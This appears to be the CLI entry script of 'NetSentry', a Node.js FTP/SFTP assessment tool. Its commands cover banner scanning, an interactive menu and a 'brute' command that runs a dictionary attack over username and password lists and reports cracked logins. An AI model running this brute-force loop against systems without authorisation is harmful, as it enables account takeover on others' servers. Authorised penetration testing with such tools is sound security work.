#!/usr/bin/env node

const { program } = require('commander');
const chalk = require('chalk');
const figlet = require('figlet');
const inquirer = require('inquirer');
const ora = require('ora');
const fs = require('fs');
const path = require('path');
const Table = require('cli-table3');
const { scanTarget } = require('../lib/core');

// --- Banner ---
console.log(
  chalk.cyan(
    figlet.textSync('NetSentry', { horizontalLayout: 'full' })
  )
);
console.log(chalk.gray(' Professional SecOps Tool v3.0.0\n'));

// --- CLI Configuration ---

program
  .version('3.0.0')
  .description('NetSentry: FTP/SFTP Security Assessment Tool');

// COMMAND: SCAN
program
  .command('scan <host>')
  .description('Perform a single target analysis')
  .option('-p, --port <number>', 'Target port', parseInt)
  .option('-u, --user <string>', 'Username', 'anonymous')
  .option('-P, --pass <string>', 'Password', 'anonymous')
  .option('--sftp', 'Use SFTP protocol', false)
  .action(async (host, options) => {
    const protocol = options.sftp ? 1 : 0;
    const port = options.port || (options.sftp ? 22 : 21);
    
    const spinner = ora(`Connecting to ${chalk.bold(host)}:${port}...`).start();
    
    try {
        const result = await scanTarget(host, port, protocol, options.user, options.pass);
        spinner.stop();

        if (result.status === 'success') {
            console.log(chalk.green('✔ Connection Established'));
            
            const table = new Table();
            table.push(
                { 'Target': chalk.white(host) },
                { 'Protocol': chalk.cyan(options.sftp ? 'SFTP' : 'FTP') },
                { 'Latency': result.connectionTimeMs + 'ms' },
                { 'Banner': chalk.yellow(result.banner || 'Hidden') },
                { 'Features': result.features.join(', ') || 'N/A' }
            );
            console.log(table.toString());
        } else {
            console.log(chalk.red('✘ Connection Failed'));
            console.log(chalk.red(`  Error: ${result.message}`));
        }
    } catch (e) {
        spinner.fail('Critical Error');
        console.error(e);
    }
  });

// COMMAND: BRUTE FORCE
program
  .command('brute <host>')
  .description('Run dictionary attack simulation')
  .option('-p, --port <number>', 'Target port', parseInt)
  .option('-U, --userlist <path>', 'Path to username list')
  .option('-W, --wordlist <path>', 'Path to password list')
  .option('--sftp', 'Use SFTP protocol', false)
  .option('--delay <ms>', 'Delay between attempts', 100)
  .action(async (host, options) => {
      const protocol = options.sftp ? 1 : 0;
      const port = options.port || (options.sftp ? 22 : 21);

      // Default Lists
      let users = ['admin', 'root', 'user'];
      let passwords = ['123456', 'password', 'admin'];

      if (options.userlist) {
          try {
            users = fs.readFileSync(options.userlist, 'utf-8').split('\n').map(s => s.trim()).filter(Boolean);
            console.log(chalk.blue(`ℹ Loaded ${users.length} usernames`));
          } catch(e) { console.error(chalk.red(`Failed to read userlist: ${e.message}`)); return; }
      }

      if (options.wordlist) {
        try {
          passwords = fs.readFileSync(options.wordlist, 'utf-8').split('\n').map(s => s.trim()).filter(Boolean);
          console.log(chalk.blue(`ℹ Loaded ${passwords.length} passwords`));
        } catch(e) { console.error(chalk.red(`Failed to read wordlist: ${e.message}`)); return; }
    }

    console.log(chalk.yellow(`\n⚠ STARTING ATTACK ON ${host}:${port}`));
    console.log(chalk.gray('Press Ctrl+C to abort\n'));

    let found = false;

    for (const user of users) {
        for (const pass of passwords) {
            process.stdout.write(`\r${chalk.gray('Testing:')} ${user}:${pass.padEnd(20)}`);
            
            // Artificial Delay
            if (options.delay > 0) await new Promise(r => setTimeout(r, options.delay));

            const result = await scanTarget(host, port, protocol, user, pass);

            if (result.status === 'success') {
                process.stdout.write('\n');
                console.log(chalk.bgGreen.black.bold(` ✔ CRACKED `) + ` ${user}:${pass}`);
                found = true;
                // Optional: break on first success? 
                // break; 
            }
        }
        if(found) break; 
    }

    if (!found) {
        process.stdout.write('\n');
        console.log(chalk.red('✘ No valid credentials found in current lists.'));
    }
  });

// COMMAND: DASHBOARD (Launch Web UI)
program
  .command('dashboard')
  .description('Launch the Graphical Web Interface')
  .action(() => {
      console.log(chalk.blue('Starting NetSentry Web Dashboard...'));
      console.log(chalk.gray('Run `npm start` in the source directory for full dev mode.'));
      require('child_process').exec('npm start', (err, stdout, stderr) => {
          if (err) {
              console.error(err);
              return;
          }
          console.log(stdout);
      });
  });

// COMMAND: INTERACTIVE
program
  .command('interactive', { isDefault: true })
  .description('Start interactive menu mode')
  .action(async () => {
    const { action } = await inquirer.prompt([
        {
            type: 'list',
            name: 'action',
            message: 'Select Operation Mode:',
            choices: [
                'Scan Target',
                'Brute Force Attack',
                'Exit'
            ]
        }
    ]);

    if (action === 'Scan Target') {
        const answers = await inquirer.prompt([
            { name: 'host', message: 'Target IP/Hostname:' },
            { name: 'port', message: 'Port:', default: '21' },
            { name: 'protocol', type: 'list', choices: ['FTP', 'SFTP'] },
            { name: 'user', message: 'Username:', default: 'anonymous' },
            { name: 'pass', type: 'password', message: 'Password:' }
        ]);

        const protocol = answers.protocol === 'SFTP' ? 1 : 0;
        const spinner = ora('Scanning...').start();
        const result = await scanTarget(answers.host, parseInt(answers.port), protocol, answers.user, answers.pass);
        spinner.stop();
        
        if (result.status === 'success') {
            console.log(chalk.green('\n✔ CONNECTION SUCCESSFUL'));
            console.log(`Banner: ${result.banner || 'N/A'}`);
        } else {
            console.log(chalk.red(`\n✘ FAILED: ${result.message}`));
        }
    } 
    
    else if (action === 'Brute Force Attack') {
        console.log(chalk.yellow('Feature available via CLI flags: netsentry brute <host>'));
    }
    
    else {
        process.exit(0);
    }
  });

program.parse(process.argv);